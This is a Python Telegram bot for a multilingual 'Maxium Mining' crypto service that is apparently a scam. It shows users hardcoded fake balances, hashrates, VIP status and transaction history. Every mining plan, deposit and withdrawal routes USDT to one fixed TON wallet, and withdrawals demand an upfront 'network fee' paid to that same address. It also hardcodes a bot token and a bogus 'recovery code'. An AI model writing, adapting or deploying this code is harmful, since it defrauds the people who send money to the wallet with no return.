import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton

# توکن ربات شما
TOKEN = '8613666293:AAEICgMQtjjS2uVerh0r71kRh-tvGNGRQr0'
bot = telebot.TeleBot(TOKEN)

# آدرس کیف پول ثابت شبکه تون
WALLET_ADDRESS = "UQDAvUYTlZV-hJKeYExgWNAcRlQH4vIdgYlbvp2AXEg6hPi4"

# ذخیره موقت زبان کاربران
user_languages = {}

# منوی اصلی کیبورد (Reply)
def get_main_keyboard(lang='fa'):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    if lang == 'en':
        markup.row(KeyboardButton("🏭 Mining Center"))
        markup.row(KeyboardButton("👤 Account"), KeyboardButton("👛 Wallet"))
        markup.row(KeyboardButton("📊 System Status"), KeyboardButton("🔑 Security"))
        markup.row(KeyboardButton("🎁 Referrals"), KeyboardButton("📖 Help"))
    elif lang == 'ru':
        markup.row(KeyboardButton("🏭 Центр майнинга"))
        markup.row(KeyboardButton("👤 Аккаунт"), KeyboardButton("👛 Кошелек"))
        markup.row(KeyboardButton("📊 Статус системы"), KeyboardButton("🔑 Безопасность"))
        markup.row(KeyboardButton("🎁 Рефералы"), KeyboardButton("📖 Помощь"))
    else:  # پیش‌فرض فارسی
        markup.row(KeyboardButton("🏭 مرکز ماینینگ"))
        markup.row(KeyboardButton("👤 حساب کاربری"), KeyboardButton("👛 کیف پول"))
        markup.row(KeyboardButton("📊 وضعیت سیستم"), KeyboardButton("🔑 امنیت حساب"))
        markup.row(KeyboardButton("🎁 دعوت از دوستان"), KeyboardButton("📖 راهنما"))
    return markup

# دستور استارت و انتخاب زبان
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("🇮🇷 فارسی", callback_data="lang_fa"),
        InlineKeyboardButton("🇬🇧 English", callback_data="lang_en"),
        InlineKeyboardButton("🇷ُّ Русский", callback_data="lang_ru")
    )
    
    welcome_text = (
        "🌟 **Welcome to Maxium Mining Bot** 🌟\n\n"
        "لطفاً زبان خود را انتخاب کنید:\n"
        "Please select your language:\n"
        "Пожалуйста, выберите язык:"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# مدیریت انتخاب زبان
@bot.callback_query_handler(func=lambda call: call.data.startswith("lang_"))
def handle_language_selection(call):
    chat_id = call.message.chat.id
    lang = call.data.split("_")[1]
    user_languages[chat_id] = lang
    
    bot.answer_callback_query(call.id)
    
    if lang == 'en':
        text = "✅ Language set to English.\nWelcome to **Maxium Mining**!"
    elif lang == 'ru':
        text = "✅ Язык установлен на русский.\nДобро пожаловать в **Maxium Mining**!"
    else:
        text = "✅ زبان روی فارسی تنظیم شد.\nبه ربات قدرتمند **Maxium Mining** خوش آمدید!"
        
    bot.send_message(chat_id, text, reply_markup=get_main_keyboard(lang), parse_mode="Markdown")

# مدیریت دکمه‌های منوی اصلی
@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    text = message.text
    chat_id = message.chat.id
    lang = user_languages.get(chat_id, 'fa')
    
    # مرکز ماینینگ
    if text in ["🏭 مرکز ماینینگ", "🏭 Mining Center", "🏭 Центр майнинга"]:
        markup = InlineKeyboardMarkup(row_width=2)
        plans = [5, 10, 15, 20, 25, 30]
        for plan in plans:
            markup.add(InlineKeyboardButton(f"💎 پلن مکسیوم {plan} USDT", callback_data=f"mining_{plan}"))
        
        bot.send_message(
            chat_id, 
            "🏭 **مرکز ماینینگ Maxium Mining**\n\nبرای فعال‌سازی و شروع استخراج، لطفاً یکی از پلن‌های سودآور زیر را انتخاب کنید:", 
            reply_markup=markup, 
            parse_mode="Markdown"
        )

    # حساب کاربری
    elif text in ["👤 حساب کاربری", "👤 Account", "👤 Аккаунт"]:
        user = message.from_user
        account_text = (
            f"👤 **اطلاعات جامع حساب کاربری**\n\n"
            f"▪️ نام کاربری: @{user.username or 'ندارد'}\n"
            f"▪️ شناسه کاربری (ID): `{user.id}`\n"
            f"▪️ تاریخ عضویت: 1405/05/13\n"
            f"▪️ وضعیت اشتراک: فعال (VIP Level 1)\n"
            f"▪️ موجودی کیف پول: `15.50 USDT`\n"
            f"▪️ آمار ماینینگ فعال: `0.125 USDT / روز`\n"
            f"▪️ سطح کاربری: پیشرفته (Advanced) 🌟"
        )
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("👛 کیف پول", callback_data="acc_wallet"),
            InlineKeyboardButton("👥 زیرمجموعه‌ها", callback_data="acc_referral"),
            InlineKeyboardButton("📜 تاریخچه تراکنش‌ها", callback_data="acc_history")
        )
        bot.send_message(chat_id, account_text, reply_markup=markup, parse_mode="Markdown")

    # کیف پول
    elif text in ["👛 کیف پول", "👛 Wallet", "👛 Кошелек"]:
        show_wallet_menu(chat_id)

    # وضعیت سیستم و سرور
    elif text in ["📊 وضعیت سیستم", "📊 System Status", "📊 Статус системы"]:
        status_text = (
            "📊 **وضعیت فنی و پایداری سیستم Maxium Mining**\n\n"
            "🟢 وضعیت سرور: کاملاً پایدار (Online)\n"
            "⚡️ قدرت پردازش و هش‌ریت: `48.2 TH/s`\n"
            "🔗 بستر اتصال و شبکه: `TON Network (Ultra Fast)`"
        )
        bot.send_message(chat_id, status_text, parse_mode="Markdown")

    # امنیت حساب
    elif text in ["🔑 امنیت حساب", "🔑 Security", "🔑 Безопасность"]:
        user_id = message.from_user.id
        recovery_code = f"MAXIUM-{user_id}-9841-TON"
        security_text = (
            f"🔑 **مرکز امنیت و بازیابی حساب**\n\n"
            f"کد بازیابی انحصاری شما:\n`{recovery_code}`\n\n"
            f"⚠️ **هشدار امنیتی مهم:** این کد محرمانه را در جای امنی یادداشت کنید. در صورت تعویض دستگاه یا از دست دادن حساب، با وارد کردن این کد تمامی موجودی و دارایی شما بدون افت سرمایه بازیابی خواهد شد."
        )
        bot.send_message(chat_id, security_text, parse_mode="Markdown")

    elif text in ["🎁 دعوت از دوستان", "🎁 Referrals", "🎁 Рефералы"]:
        bot.send_message(chat_id, "🎁 **سیستم پاداش معرفی دوستان**\n\nلینک اختصاصی شما:\n`https://t.me/MaxiumMining_Bot?start=ref12345`\n\nبا دعوت هر دوست، پاداش متناسب دریافت کنید.")

    elif text in ["📖 راهنما", "📖 Help", "📖 Помощь"]:
        bot.reply_to(message, "📖 راهنمای جامع استفاده از ربات Maxium Mining و پاسخ به سوالات متداول...")

# تابع نمایش منوی کیف پول
def show_wallet_menu(chat_id):
    wallet_text = "👛 **مدیریت پیشرفته کیف پول**\n\nموجودی کل: `15.50 USDT`\nلطفاً عملیات مورد نظر خود را انتخاب کنید:"
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📤 برداشت وجه", callback_data="wallet_withdraw"),
        InlineKeyboardButton("📥 واریز وجه", callback_data="wallet_deposit"),
        InlineKeyboardButton("📜 تاریخچه تراکنش‌ها", callback_data="wallet_history"),
        InlineKeyboardButton("🎁 پاداش‌ها", callback_data="wallet_rewards")
    )
    bot.send_message(chat_id, wallet_text, reply_markup=markup, parse_mode="Markdown")

# مدیریت کال‌بک‌های شیشه‌ای
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    data = call.data
    chat_id = call.message.chat.id
    
    if data.startswith("mining_"):
        amount = data.split("_")[1]
        text = (
            f"💎 **فعال‌سازی پلن ماینینگ: {amount} USDT**\n\n"
            f"برای تأیید و استارت این پلن در Maxium Mining، لطفاً دقیقاً مبلغ **{amount} تتر** را به آدرس زیر واریز کنید:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"⚠️ **هشدار بسیار مهم:** فقط از طریق شبکه **TON** و ترجیحاً کیف پول **Tonkeeper** مبلغ را انتقال دهید تا سیستم به صورت اتوماتیک پلن شما را فعال کند."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("✅ ارسال رسید پرداخت", callback_data="send_receipt"))
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

    elif data == "send_receipt":
        bot.answer_callback_query(call.id, "لطفاً تصویر رسید تراکنش خود را به همین چت ارسال کنید.")
        bot.send_message(chat_id, "📸 لطفاً تصویر رسید واریز تتر خود را ارسال کنید تا تیم پشتیبانی تایید نهایی را انجام دهد.")

    elif data == "acc_wallet":
        show_wallet_menu(chat_id)

    elif data == "acc_referral":
        ref_text = "👥 **آمار دعوت از دوستان**\n\n▪️ تعداد کل دعوت‌شده‌ها: ۳ نفر\n▪️ پاداش دریافتی کل: `3.00 USDT`"
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, ref_text, parse_mode="Markdown")

    elif data == "acc_history" or data == "wallet_history":
        history_text = "📜 **تاریخچه تراکنش‌های اخیر:**\n\n1️⃣ واریز پلن 5 USDT (موفق ✅)\n2️⃣ برداشت وجه 2 USDT (تایید شده ✅)"
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, history_text, parse_mode="Markdown")

    elif data == "wallet_withdraw":
        markup = InlineKeyboardMarkup(row_width=2)
        plans = [5, 10, 15, 20, 25, 30]
        for p in plans:
            markup.add(InlineKeyboardButton(f"📤 برداشت {p} USDT", callback_data=f"wd_plan_{p}"))
        
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "📤 **بخش برداشت وجه**\n\nلطفاً میزان مبلغ برداشت مورد نظر خود را انتخاب کنید:", reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("wd_plan_"):
        amount = data.split("_")[2]
        text = (
            f"📤 **درخواست برداشت: {amount} USDT**\n\n"
            f"برای تسویه حساب و فعال‌سازی برداشت آنی، کارمزد شبکه را به آدرس زیر واریز کنید:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"⚠️ **هشدار مهم:** فقط از طریق شبکه **TON** و ترجیحاً کیف پول **Tonkeeper** اقدام کنید تا دکمه برداشت نهایی برای شما باز شود."
        )
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, parse_mode="Markdown")

    elif data == "wallet_deposit":
        markup = InlineKeyboardMarkup(row_width=2)
        plans = [5, 10, 15, 20, 25, 30]
        for p in plans:
            markup.add(InlineKeyboardButton(f"📥 شارژ {p} USDT", callback_data=f"dep_plan_{p}"))
            
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "📥 **بخش واریز و شارژ حساب**\n\nلطفاً مبلغ مورد نظر برای شارژ را انتخاب کنید:", reply_markup=markup, parse_mode="Markdown")

    elif data.startswith("dep_plan_"):
        amount = data.split("_")[2]
        text = (
            f"📥 **شارژ کیف پول: {amount} USDT**\n\n"
            f"جهت افزایش موجودی در Maxium Mining، مبلغ {amount} تتر را به آدرس کیف پول زیر ارسال فرمایید:\n\n"
            f"`{WALLET_ADDRESS}`\n\n"
            f"⚠️ **هشدار مهم:** حتماً از شبکه **TON** و کیف پول **Tonkeeper** استفاده کرده و سپس رسید انتقال را ارسال کنید."
        )
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, text, parse_mode="Markdown")

    elif data == "wallet_rewards":
        rewards_text = "🎁 **بخش پاداش‌ها و هدیه‌ها**\n\nشما در حال حاضر پاداش آماده دریافت ندارید."
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, rewards_text, parse_mode="Markdown")

# اجرای ربات
bot.infinity_polling()

